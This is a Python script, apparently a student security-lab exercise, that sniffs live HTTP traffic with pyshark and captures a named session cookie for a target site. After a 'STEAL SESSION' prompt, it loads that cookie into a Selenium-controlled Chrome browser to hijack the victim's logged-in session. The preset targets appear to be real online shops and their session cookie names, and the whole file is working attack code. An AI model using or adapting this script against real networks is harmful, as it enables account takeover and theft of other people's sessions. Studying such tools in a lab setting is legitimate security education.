import pyshark
from selenium import webdriver

#Wojciech Wróblewski zad2/lab2/bezpieczeństwo


class SNIFFER:

    def __init__(self, interface, page, cookie):
        self.interface = interface
        self.SEARCH_CRITERIA = "http.cookie || http.cookie_pair"
        self.COOKIE = cookie
        self.COUNTER = 0
        self.PATH = "/usr/local/bin/chromedriver"
        self.PAGE = page

    # view page
    def upload_page(self, pkg, wanted_cookie):

        base_url = pkg.http.referer
        browser = webdriver.Chrome(executable_path=self.PATH)
        browser.get(base_url)
        browser.add_cookie(wanted_cookie)
        browser.refresh()

    #sniff constinously and capute speific cookie data
    def get_session(self):
        capture = pyshark.LiveCapture(interface=self.interface, display_filter=self.SEARCH_CRITERIA )   

        for pkg in capture.sniff_continuously():

            if pkg.http.host in self.PAGE:
                try:

                    wanted_cookie = self.extract_wanted_cookie(pkg)

                    # if its not None we know that this is wanted/predefined cookies
                    if wanted_cookie != None:

                        if wanted_cookie["name"] in self.COOKIE:

                            print("STEAL SESSION from ",pkg.http.host," ? yes to steal, no to quit")

                            answer = input()
                            if answer == "yes":

                                #self.upload_page(pkg,wanted_cookie)
                                base_url = pkg.http.referer
                                browser = webdriver.Chrome(executable_path=self.PATH)
                                browser.get(base_url)
                                browser.add_cookie(wanted_cookie)
                                browser.refresh()

                            elif answer == "no":
                                 break

                except AttributeError as e:
                    continue
           
    
    # if wanted cookie has been recognised return, else None
    def extract_wanted_cookie(self,pkg) :
        
        cookies = pkg.http.cookie

        for cookie in self.dump_to_dict(cookies):

            if cookie["name"] == self.COOKIE and cookie["name"] != None:
                return cookie

        return None

    # return string of cookies into list of dict pairs.
    def dump_to_dict(self, cookies):

        list_of_pairs = []
        el_splitto = cookies.split("; ")
        for s in el_splitto:
            s = s.split("=")
            name = s[0]
            value = s[1]
            dict = {}
            dict["name"] = name
            dict["value"] = value

            list_of_pairs.append(dict)

        return list_of_pairs


              

#predefined params as object params

sniffer = SNIFFER("enp0s3", "sklepyzeglarskie.pl", "soteshop")
#sniffer = SNIFFER("enp0s3", "bakista.pl", "_gid")
sniffer.get_session()
